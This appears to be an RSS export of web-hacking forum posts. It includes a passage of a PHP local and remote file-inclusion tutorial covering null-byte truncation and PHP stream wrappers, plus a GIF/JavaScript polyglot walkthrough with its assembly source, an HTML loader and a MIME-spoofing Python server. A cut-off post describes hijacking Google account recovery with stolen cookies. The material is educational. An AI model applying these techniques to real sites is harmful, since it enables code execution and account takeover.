+<div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/c/c7f1edfeb0df72bd314e0febf7a9bb390be62987.png" data-download-href="/uploads/short-url/swNlBNcuNwBBP0l0dWxCdx9BL15.png?dl=1" title="1818744731.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/c/c7f1edfeb0df72bd314e0febf7a9bb390be62987.png" width="690" height="115"></a></div><p></p>
+<p>There is no noticeable effect here either.</p>
+<p>So we can see that as long as the above three conditions are satisfied, <code>%00</code> can be used.<br>
+First we change the PHP version to 5.2 and restart <code>Apache</code> after <code>php.ini</code> changes <code>magic_quotes_gpc = on</code> to<code> magic_quotes_gpc = off</code>.<br>
+This enables us to use truncation when attempted.<br>
+</p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/b/b5228533fa5245c13b8ff0d3aef8608ae9a7a978.png" data-download-href="/uploads/short-url/pQonETbMpaH4mPVxt5vLi6vfHxm.png?dl=1" title="3535381620.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/b/b5228533fa5245c13b8ff0d3aef8608ae9a7a978.png" width="690" height="370"></a></div><p></p>
+<p>We can see that we have successfully made use of truncated inclusion.<br>
+So does the file only contain the included functions?<br>
+That is certainly not the case, since we have control of what can be included let’s do this <img src="https://d.clarkee.co.uk/images/emoji/twitter/wink.png?v=15" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"> .<br>
+Let’s create a file: <code>shell.txt</code>  to further exploit this vulnerability.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/5/5786ff7369c269f5c715b0ed2dfdf7e240155593.png" data-download-href="/uploads/short-url/cuiLPDPIvUQseFKl0jl26x1Q2UH.png?dl=1" title="2315018220.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/5/5786ff7369c269f5c715b0ed2dfdf7e240155593.png" width="690" height="266"></a></div><p></p>
+<p>We can see,  including <code>shell</code> is not a problem either.</p>
+<p>So what is the difference between the two? In fact, there is no difference, the principle is the same, but the first is introduced with the suffix, the second is fixed in the program dead suffix. But <code>% 00</code> can be used because it terminates directly when the program stream encounters<code>% 00</code> terminator.</p>
+<h2><a name="p-20791-remote-file-inclusion-3" class="anchor" href="https://d.clarkee.co.uk#p-20791-remote-file-inclusion-3"></a>remote file inclusion</h2>
+<hr>
+<blockquote>
+<p>The local file contains the same principle as the remote file, except that the former can only contain the files that exist on the server, and the latter can contain the files on the remote server.</p>
+</blockquote>
+<p>For remote files we need to consider the following:</p>
+<ol>
+<li>Need <code>allow_url_include = on</code> and<code> allow_url_fopen = on</code> in <code>php.ini</code></li>
+<li>The required remote file suffix  cannot be the same as the target server’s language, such as (the target server parses PHP code, then the remote file suffix  can not be <code>.php</code>)</li>
+</ol>
+<p>Let me  explain the second point.<br>
+If your remote file has  <code>.php</code> suffix and your remote file content is something like:</p>
+<pre data-code-wrap="php"><code class="lang-php">&lt;? php
+phpinfo ();
+</code></pre>
+<p>Then the contents of the target server are obtained after your remote server executes <code>phpinfo()</code><br>
+It will not run the code, so the information contained is not the target server but your remote server.</p>
+<p>This is illustrated below:</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/6/6cd5ad78e8088cb36b875de34fbd6b621ae0b5a9.png" data-download-href="/uploads/short-url/fwNmStGsfO6pbEgmdydlcmk1PAJ.png?dl=1" title="3402461499.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/6/6cd5ad78e8088cb36b875de34fbd6b621ae0b5a9.png" width="690" height="354"></a></div><p></p>
+<p>This is my remote machines information for PHP5.6 version, the target machine is version 5.2.<br>
+Next we  include the file!</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/5/577c41d3605fc572349e45b8ce65d822153b3ee0.png" data-download-href="/uploads/short-url/ctVL5Vjr5m6l1bvtYdWvm9SekjC.png?dl=1" title="3378068281.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/5/577c41d3605fc572349e45b8ce65d822153b3ee0.png" width="690" height="262"></a></div><p></p>
+<p>We can see that after the file is included, our remote machine changed! why??<br>
+Because the target server does not contain the this code:</p>
+<pre data-code-wrap="php"><code class="lang-php">&lt;? php phpinfo ();?&gt;
+</code></pre>
+<p>Instead, the remote server executes the source code of this code, as shown below:</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/6/6a30ad566e39bbda00f3f0b9bb4f315fd5e68237.png" data-download-href="/uploads/short-url/f9oTVznApsg4L1wtmJTAobrHTdZ.png?dl=1" title="3891035635.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/6/6a30ad566e39bbda00f3f0b9bb4f315fd5e68237.png" width="690" height="299"></a></div><p></p>
+<p>So to make this attack work we need to make a few modifications:</p>
+<pre><code>1.Modify the configuration
+</code></pre>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/9/9d6a5450003f9e1d70e1f8498169e0a5ac6931e5.png" data-download-href="/uploads/short-url/msyLTeqmFBTjeXdMVRmj6SxmZCt.png?dl=1" title="3765667797.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/9/9d6a5450003f9e1d70e1f8498169e0a5ac6931e5.png" width="690" height="403"></a></div><p></p>
+<pre><code>2.Modify the file suffix
+</code></pre>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/7/739da95d6170bb79d091bd57d29817adaef50c66.png" data-download-href="/uploads/short-url/guMHf7kC5RYVIaPHTdZ0C1si2bA.png?dl=1" title="2234506515.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/7/739da95d6170bb79d091bd57d29817adaef50c66.png" width="690" height="261"></a></div><p></p>
+<p>Let’s try the include attack vector again:</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/7/70672c40d7e71ce1481c9480c6c942e674926d88.png" data-download-href="/uploads/short-url/g2mwssxKPcre1WioRMqu05iJghi.png?dl=1" title="1549644820.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/7/70672c40d7e71ce1481c9480c6c942e674926d88.png" width="690" height="308"></a></div><p></p>
+<p>We can see the desired information got returned after this inclusion and  our target machine information did not change anymore.</p>
+<p>Next up we want to do the shell example again for the remote file inclusion<br>
+</p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/a/a347797c13a6cae981510d1981bc0e77a479a7a9.png" data-download-href="/uploads/short-url/niqXAQHvFFL90rP7SaO3zD4u5st.png?dl=1" title="58443275.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/a/a347797c13a6cae981510d1981bc0e77a479a7a9.png" width="690" height="251"></a></div><p></p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/1/175199f68f5da62743bc5e59ad2d4a6560987930.png" data-download-href="/uploads/short-url/3khOlwYVXw82jxuAbESyLODXCqQ.png?dl=1" title="3886119717.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/1/175199f68f5da62743bc5e59ad2d4a6560987930.png" width="690" height="184"></a></div><p></p>
+<p>Remote file contains the use of the premise is in line with the local file contains the premise and meet the remote file contains the premise of its availability.</p>
+<h2><a name="p-20791-file-contains-on-of-many-pseudo-protocols-4" class="anchor" href="https://d.clarkee.co.uk#p-20791-file-contains-on-of-many-pseudo-protocols-4"></a>File contains on of many pseudo-protocols</h2>
+<hr>
+<p>There can be quite a few different pseudo-protocols contained in a file.<br>
+I’ll demonstrate a few of them below.</p>
+<p><code>data:text/plain</code> or <code>data: text/plain; base64</code><br>
+<code>php://input</code><br>
+<code>php://filter</code><br>
+<code>file://</code><br>
+<code>zip://</code></p>
+<p>Other protocols can looked up in the official <a href="http://php.net/manual/en/wrappers.php.php" rel="noopener nofollow ugc">documentation</a></p>
+<h2><a name="p-20791-datatextplain-5" class="anchor" href="https://d.clarkee.co.uk#p-20791-datatextplain-5"></a>data:text/plain</h2>
+<p>Output is directly in the corresponding URL showing the parameters: <code>data:text/plain</code>.<br>
+Then we need to execute the php code as shown below:<br>
+</p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/0/020b54231a1d3f6d061e97cf43821a36bccc809a.png" data-download-href="/uploads/short-url/i5e2BytQsPJ6wLCG6ZUxDwjyKC.png?dl=1" title="3116914365.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/0/020b54231a1d3f6d061e97cf43821a36bccc809a.png" width="690" height="301"></a></div><p></p>
+<h2><a name="p-20791-data-textplain-base64-6" class="anchor" href="https://d.clarkee.co.uk#p-20791-data-textplain-base64-6"></a>data: text/plain; base64</h2>
+<p>For data: text/plain; base64` there is another way to use it.<br>
+We need to execute PHP code using base64 encoding: the base64php code is as shown below:<br>
+</p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/9/9ffdb1585b2e4db9952d4140f508ea11e46922e3.png" data-download-href="/uploads/short-url/mPls1zhfYuYmUI19F4SuMlsjQeD.png?dl=1" title="4064850690.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/9/9ffdb1585b2e4db9952d4140f508ea11e46922e3.png" width="690" height="268"></a></div><p></p>
+<hr>
+<h2><a name="p-20791-phpinput-7" class="anchor" href="https://d.clarkee.co.uk#p-20791-phpinput-7"></a>php://input</h2>
+<p><code>php://input</code> accesses the read-only stream of the requested raw data, executing the data in the post request as PHP code.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/c/c951274feca3fff6238a1dbc5d6a8f4df222cdda.png" data-download-href="/uploads/short-url/sIVQdFZcCoJ3hWPvrx6rxvVy4qu.png?dl=1" title="1475499797.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/c/c951274feca3fff6238a1dbc5d6a8f4df222cdda.png" width="638" height="500"></a></div><p></p>
+<p>You can see that the program has automatically an added <code>.php</code> suffix.<br>
+Hence using include <code>php://input</code> will automatically add<code> .php</code> so it is certainly not working properly.<br>
+We can come back to the nifty little <code>%00</code> trick to  truncate the file path!</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/b/b9e4b271170212c6da6b01fc471580e11d6c20c6.png" data-download-href="/uploads/short-url/qwujpQXtesMNOZJQKchvH67onhs.png?dl=1" title="655724549.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/b/b9e4b271170212c6da6b01fc471580e11d6c20c6.png" width="690" height="406"></a></div><p></p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/7/7cfc74c15c0601d0a57ff95a6c327b7135f21e35.png" data-download-href="/uploads/short-url/hPG5DJJQqEqgIL3yLrVQjwixUPz.png?dl=1" title="1209641233.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/7/7cfc74c15c0601d0a57ff95a6c327b7135f21e35.png" width="690" height="405"></a></div><p></p>
+<p>You can see the terminator is very powerful.</p>
+<hr>
+<h2><a name="p-20791-phpfilter-8" class="anchor" href="https://d.clarkee.co.uk#p-20791-phpfilter-8"></a>php://filter</h2>
+<p><code>php://filter</code> can read the php file code base64 encoded output and return it to us.<br>
+For example, we want to read a php file but do not want it to be normal php.</p>
+<blockquote>
+<p>Usage: php://filter/read=convert.base64-encode/resource=<br>
+<code>../ressource=</code>  needs to read the contents of the file code</p>
+</blockquote>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/b/b510a771a9256a3566469349a8f6bb6ab5b68aac.png" width="" height=""></p>
+<p>After decoding the base64 we can get the contents as usual:</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/7/71418d71d76d011f2f49392b9a6fec1afec8bccb.png" data-download-href="/uploads/short-url/g9UoMLBYEllZubY9TzlDqOKvwnh.png?dl=1" title="1600112980.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/7/71418d71d76d011f2f49392b9a6fec1afec8bccb.png" width="690" height="313"></a></div><p></p>
+<hr>
+<h2><a name="p-20791-file-9" class="anchor" href="https://d.clarkee.co.uk#p-20791-file-9"></a>file://</h2>
+<p><code>file://</code> is used to access the local file system and is not affected by <code>allow_url_fopen</code> or<code> allow_url_include</code>.</p>
+<blockquote>
+<p>Usage: file://absolute/path/to/file</p>
+</blockquote>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/7/76e5f445208f29adfa3ed31b23a895c5f749116a.png" data-download-href="/uploads/short-url/gXP0ZMaGz2s75pLFRNp19ApCY7E.png?dl=1" title="1283401618.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/7/76e5f445208f29adfa3ed31b23a895c5f749116a.png" width="690" height="111"></a></div><p></p>
+<hr>
+<h2><a name="p-20791-zip-10" class="anchor" href="https://d.clarkee.co.uk#p-20791-zip-10"></a>zip://</h2>
+<p><code>zip://</code>  can access the files in a zip file. But it needs an absolute path.</p>
+<blockquote>
+<p>Usage: zip://[archive absolute path] # [compressed file name]</p>
+</blockquote>
+<p>Create a file locally and compress it into a zip archive.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/0/0ba095d892bf4653340cb40bff79ac039d54ef4e.png" data-download-href="/uploads/short-url/1ERiT9tljjIs8MbccdSxXdi7LJA.png?dl=1" title="1079623094.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/0/0ba095d892bf4653340cb40bff79ac039d54ef4e.png" width="690" height="113"></a></div><p></p>
+<p>You can see that I have already filled in the absolute path and the name of the file.<br>
+Why we cannot include it successfully shows the error:</p>
+<blockquote>
+<p>Warning: include (<code>zip://C:/phpStudy/WWW/include/phpinfo.zip.php</code>)</p>
+</blockquote>
+<p>We do not want to include this file, instead we want to include the file inside the zip!<br>
+Why is the value after <code># </code> gone?<br>
+Because <code>#</code> will ignore the parameters behind it, so we need to use the  <code>%23</code>  in the form.<br>
+Another point is that the included file ends in a <code>.php</code>, but we compressed the file for the php suffix.<br>
+So we do not need to have this suffix, as shown below:</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/7/773e8f197dc8da7fc0953227e4da4d4aba52c2bc.png" data-download-href="/uploads/short-url/h0SQLbJvZ6uqypdTyEOZ9BtNmwY.png?dl=1" title="2347902263.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/7/773e8f197dc8da7fc0953227e4da4d4aba52c2bc.png" width="690" height="218"></a></div><p></p>
+<p>PS：My English is not good, please understand!</p>
+            <p><small>17 posts - 8 participants</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/php-file-inclusion-vulnerability/5200">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/php-file-inclusion-vulnerability/5200</link>
+          <pubDate>Wed, 31 Jan 2018 07:46:24 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-5200</guid>
+          <source url="https://d.clarkee.co.uk/t/php-file-inclusion-vulnerability/5200.rss">[PHP] File inclusion vulnerability</source>
+        </item>
+        <item>
+          <title>Hackazon: A Vulnerable Web App for Sharpening Your Axe</title>
+          <dc:creator><![CDATA[fraq]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <p>If you’re familiar with the Damn Vulnerable Web App (DVWA) then you will love this. It’s called Hackazon and in its own words:</p>
+<blockquote>
+<p>Hackazon is a free, vulnerable test site that is an online storefront built with the same technologies used in today’s rich client and mobile applications. Hackazon has an AJAX interface, strict workflows and RESTful API’s used by a companion mobile app providing uniquely-effective training and testing ground for IT security professionals. And, it’s full of your favorite vulnerabilities like SQL Injection, cross-site scripting and so on.</p>
+</blockquote>
+<p>I plan to pull and run this myself in the coming days. Let me know what you think in the comments down below.</p>
+<p><a href="https://n0where.net/modern-vulnerable-web-app-hackazon" class="onebox" target="_blank" rel="noopener nofollow ugc">https://n0where.net/modern-vulnerable-web-app-hackazon</a></p>
+            <p><small>5 posts - 4 participants</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/hackazon-a-vulnerable-web-app-for-sharpening-your-axe/5091">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/hackazon-a-vulnerable-web-app-for-sharpening-your-axe/5091</link>
+          <pubDate>Thu, 25 Jan 2018 06:23:54 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-5091</guid>
+          <source url="https://d.clarkee.co.uk/t/hackazon-a-vulnerable-web-app-for-sharpening-your-axe/5091.rss">Hackazon: A Vulnerable Web App for Sharpening Your Axe</source>
+        </item>
+        <item>
+          <title>GIF/Javascript Polyglots: Abusing GIFs, tags, and MIME types for evil</title>
+          <dc:creator><![CDATA[fraq]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <p><em>Note: This is a repost from my <a href="http://blog.fraq.io/tech/gif-javascript-polyglots/" rel="nofollow noopener">personal blog</a></em></p>
+<h1>GIF/Javascript Polyglots: Abusing GIFs, tags, and MIME types for evil</h1>
+<p>6 minute read</p>
+<h3>The backstory</h3>
+<p>Recently I saw a feature on a product I work on where we allowed hotlinking to arbitrary gifs without pulling them in, mangling, and then saving for our own use. Right away I thought, “Well this isn’t wise” and set off to find ways to abuse it. The easiest and most obvious was to link to an image and then swap it out for a less savoury one later. Kid stuff, right? Let’s do some real damage. Spoiler alert: I made a really cool thing but didn’t get to weaponize it the way I wanted to.</p>
+<p>After proving that I could swap out images with ease from a server I controlled, I started looking for ways to embed executable into the image, which is how I stumbled upon this idea of polyglots. In this context, a polyglot is something that is valid code in two or more languages. For our use case, we want a gif/javascript polyglot.</p>
+<h3>Getting down to business</h3>
+<p>As always, research starts with Google and IRC. I had a feeling that something like this had been done before, so I set about finding papers, posts, or anything really that pointed me to what I was looking for. In short order, I found a couple of good resources that explained the attack and how to craft a malicious gif.</p>
+<p>The basic idea is to use ASM and manually assemble a GIF, filling in the required header and fields. By setting the width to a specific value of 10799, when the gif is rendered as a script, this is interpreted as a /* in ASCII, which is the opening of a Javascript comment block. When interpreted as an img, the browser simply renders the image that wide. The content and fields of the gif are contained between the opening and closing comment blocks of the JS portions, and the comment is closed at the end of the gif. The JS to execute is tacked onto the end of the GIF and is executed when interpreted as a script. I have included a link to the original gist at the bottom of this post, but here is an example of one such gif:</p>
+<pre><code class="lang-auto">; a hand-made GIF containing valid JavaScript code
+; abusing header to start a JavaScript comment
+
+; inspired by Saumil Shah's Deadly Pixels presentation
+
+; Ange Albertini, BSD Licence 2013
+
+; yamal gifjs.asm -o img.gif
+
+WIDTH equ 10799 ; equivalent to 2f2a, which is '/*' in ASCII, thus starting an opening comment
+
+HEIGTH equ 100 ; just to make it easier to spot
+
+db 'GIF89a'
+    dw WIDTH, HEIGTH
+
+db 0 ; GCT
+    db -1 ;  background color
+    db 0 ; default aspect ratio
+    ;db 0fch, 0feh, 0fch
+    ;times COLORS db 0, 0, 0
+
+; no need of Graphic Control Extension
+ ; db 21h, 0f9h
+ ; db GCESIZE ; size
+ ; gce_start:
+ ;     db 0 ; transparent background
+ ;     dw 0 ; delay for anim
+ ;     db 0 ; other transparent
+ ; GCESIZE equ $ - gce_start
+ ;     db 0 ; end of GCE
+
+db 02ch ; Image descriptor
+    dw 0, 0 ; NW corner
+    dw WIDTH, HEIGTH ; w/h of image
+    db 0    ; color table
+
+db 2 ; lzw size
+
+;db DATASIZE
+;data_start:
+;    db 00, 01, 04, 04
+;    DATASIZE equ $ - data_start
+
+db 0
+db 3bh ; GIF terminator
+
+; end of the GIF
+
+db '*/'  ; closing the comment
+db '=1;' ; creating a fake use of that GIF89a string
+
+db 'alert("haxx");'
+</code></pre>
+<p>As you can see, we close the comment block at the end and add our own Javascript. When interpreted as a script, the parser skips over all the GIF-related stuff and just worries about the JS at the end.</p>
+<h3>Compiling</h3>
+<p>As a product of my own stupidity and failure to follow directions, I mistakenly assumed for a bit that the recommended compiler, yasm, was Windows-only. After far too long fighting YASM and C++ runtime trying to get the stupid thing to work, I noticed that I could just pull the source and compile it on my local machine. Sweet! After that, compiling this was a breeze:</p>
+<pre><code class="lang-auto">$ yasm ./gifjs.asm -o img.gif
+</code></pre>
+<h3>Execution and Exploitation</h3>
+<p>Unfortunately, here’s where things get a little sad. In order to actually get this to work, I had to do it under some contrived conditions that, while not impossible, are unlikely (in my opinion).</p>
+<ol>
+<li>You have to have the gif interpreted with  tags as opposed to <img> tags</li>
+<li>You have to send a misleading MIME type</li>
+</ol>
+<p>These two conditions mean that it’s unlikely you will find something in the wild which you can abuse. You’re better off using a server you already control and setting up explotation conditions favorable to yourself.</p>
+<p>To get this to run, I wrote the following tiny bit of HTML:</p>
+<pre><code class="lang-auto">This is a test
+&lt;img src="img.gif"&gt;
+&lt;script src="img.gif"&gt;&lt;/script&gt;
+</code></pre>
+<p>As you can see, it just throws up a bit of test, displays the malicious GIF as an image, and then again as a script. If you pop open your browser and go to the file in your local filesystem (say, <code>/tmp/test.html</code> for instance), the gif will pop the alert box for you. Fun, right?</p>
+<p>Now try uploading it to an image hosting site such as Imgur and sourcing it from there. You’ll notice something interesting happens. Or rather, doesn’t happen. If you try to run the above HTML but using a direct link to a .gif on Imgur instead, you’ll notice that your browser’s console likely displays an error saying something to this effect:</p>
+<pre><code class="lang-auto">Refused to execute script from 'https://i.imgur.com/IXGn93f.gif' because its MIME type ('image/gif') is not executable.
+</code></pre>
+<p><em>Detour: what the heck is a MIME type?</em></p>
+<p>MIME types aren’t really anything more complex than a label that gets stuck onto some data to tell the receiving end what type of data it is. This lets the client know how it can handle the data. This is just a label and is built on trust. What do we do with trust? We abuse it. Back to your regularly scheduled programming.</p>
+<p>This brings me back to point <span class="hashtag">#2:</span> You need to send a misleading MIME type to convince the browser to execute your file. We already know that Imgur won’t allow us to do that, so how do we do it? In my case, I used a simple bit of python.</p>
+<pre><code class="lang-python">import SimpleHTTPServer
+import SocketServer
+
+PORT = 8000
+
+class Handler(SimpleHTTPServer.SimpleHTTPRequestHandler):
+    pass
+
+Handler.extensions_map['.gif'] = 'application/octet-stream'
+
+httpd = SocketServer.TCPServer(("", PORT), Handler)
+
+print "serving at port", PORT
+httpd.serve_forever()
+</code></pre>
+<p>This uses SimpleHTTPServer, which is already in Python’s standard libraries, to serve the contents of the local directory. By default, SimpleHTTPServer will try and give things appropriate MIME types based on extensions, so we add a smal change to tell it to interpret .gif extensions as application/octect-stream, which browsers will execute. If I named that html file as index.html, I can now hit <a href="http://127.0.0.1:8000/index.html" rel="nofollow noopener">http://127.0.0.1:8000/index.html</a> and get our malicious gif served back with a MIME type that it is okay with executing. The result? We run the JS compiled into the GIF.</p>
+<h3>Conclusion</h3>
+<p>This is not a new or novel attack. This is also not something I feel is widely exploitable, but it is fairly sneaky and exposes a few areas of trust that we can abuse.</p>
+<ul>
+<li>Browsers do little in the way of actual heuristics when trying to determine file type. At best, they will look at the extension and magic byte to try and determine if the file is what it claims to be.</li>
+<li>This is a valid GIF and a valid bit of JS, so heuristics would have to be more sophisticated to catch something like this.</li>
+<li>Browsers trust MIME types perhaps a bit too much.</li>
+<li>This would be easy to exploit and hard to detect using a site you control, since users wouldn’t be able to see the JS that is being executed.</li>
+<li>Then again, they might see that something.js was being executed but might not be able to GET the file to see what is in it.</li>
+<li>Obfuscation level: 3/10.</li>
+</ul>
+<p>It’s interesting. It’s fun. It’s simple.</p>
+<p><em>References</em></p>
+<p><a href="https://ajinabraham.com/blog/bypassing-content-security-policy-with-a-jsgif-polyglot" class="onebox" target="_blank" rel="nofollow noopener">https://ajinabraham.com/blog/bypassing-content-security-policy-with-a-jsgif-polyglot</a></p>
+<p><a href="https://gist.githubusercontent.com/ajinabraham/f2a057fb1930f94886a3/raw/62b8e455ad62c42222de9059cd0d20c1a79e2cdb/gifjs.asm" class="onebox" target="_blank" rel="nofollow noopener">https://gist.githubusercontent.com/ajinabraham/f2a057fb1930f94886a3/raw/62b8e455ad62c42222de9059cd0d20c1a79e2cdb/gifjs.asm</a></p>
+<p><a href="http://blog.portswigger.net/2016/12/bypassing-csp-using-polyglot-jpegs.html" class="onebox" target="_blank" rel="nofollow noopener">http://blog.portswigger.net/2016/12/bypassing-csp-using-polyglot-jpegs.html</a></p>
+            <p><small>12 posts - 5 participants</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/gif-javascript-polyglots-abusing-gifs-tags-and-mime-types-for-evil/5088">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/gif-javascript-polyglots-abusing-gifs-tags-and-mime-types-for-evil/5088</link>
+          <pubDate>Thu, 25 Jan 2018 00:05:36 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-5088</guid>
+          <source url="https://d.clarkee.co.uk/t/gif-javascript-polyglots-abusing-gifs-tags-and-mime-types-for-evil/5088.rss">GIF/Javascript Polyglots: Abusing GIFs, tags, and MIME types for evil</source>
+        </item>
+        <item>
+          <title>Using a LFI to get a RCE in webhacking</title>
+          <dc:creator><![CDATA[nodauf]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <p>Hello everyone,</p>
+<p>It is my first post here so tell me if I do something wrong.</p>
+<p>During a CTF with a LFI vulnerability. I found <a href="https://dustri.org/b/from-lfi-to-rce-in-php.html" rel="nofollow noopener">this article</a> talking about getting a RCE from a LFI using the temporary file of php.</p>
+<p>So I think It is a good idea to share this article here.</p>
+            <p><small>1 post - 1 participant</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/using-a-lfi-to-get-a-rce-in-webhacking/2827">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/using-a-lfi-to-get-a-rce-in-webhacking/2827</link>
+          <pubDate>Thu, 06 Jul 2017 23:50:10 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>No</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-2827</guid>
+          <source url="https://d.clarkee.co.uk/t/using-a-lfi-to-get-a-rce-in-webhacking/2827.rss">Using a LFI to get a RCE in webhacking</source>
+        </item>
+        <item>
+          <title>What tools you use for web scraping?</title>
+          <dc:creator><![CDATA[CGMS]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <p>The title is self-explanatory.<br>
+I use Python with requests and BeautifulSoup.<br>
+(Writing this post I saw that there is a tutorial on how to use this tools <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:">)</p>
+            <p><small>14 posts - 12 participants</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/what-tools-you-use-for-web-scraping/2714">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/what-tools-you-use-for-web-scraping/2714</link>
+          <pubDate>Fri, 30 Jun 2017 20:22:46 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-2714</guid>
+          <source url="https://d.clarkee.co.uk/t/what-tools-you-use-for-web-scraping/2714.rss">What tools you use for web scraping?</source>
+        </item>
+        <item>
+          <title>Google Recovery Based Password Reset Flaw</title>
+          <dc:creator><![CDATA[hack3rsp0t]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <p>Hi There,<br>
+I have been looking in Google Reset Recovery Method for gmail for quite some time.<br>
+Before April 2017<br>
+Anyone could have reset gmail password using correct account creation date and month with a tolerance value of 4 months if you are initiating recovery process from a trusted home network which you have previously used to login in your account.<br>
+Home Network n IP thing can easily bypassed if you know your user IP and spoof your IP to 3 places of network address same as user using some kind of proxy server (not hard in some cases ) Also some neat trick would be like asking person to share Hotspot to access internet and then initiate a recovery for the same user.</p>
+<p>How ever when google rollout its new UI and Security login update in april 2017.This thing gone.<br>
+Now Recovery mechanism dont rely on IP or Trusted Home network.<br>
+Now They Have tagged this with Account_Chooser and GAPS Cookie.<br>
+Now if You have these cookie of any user account no matter if he is signed out of his account<br>
+one can reset the password using above mentioned method.<br>
+I want to ask if there is anyone who used this or working on this method <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"><br>
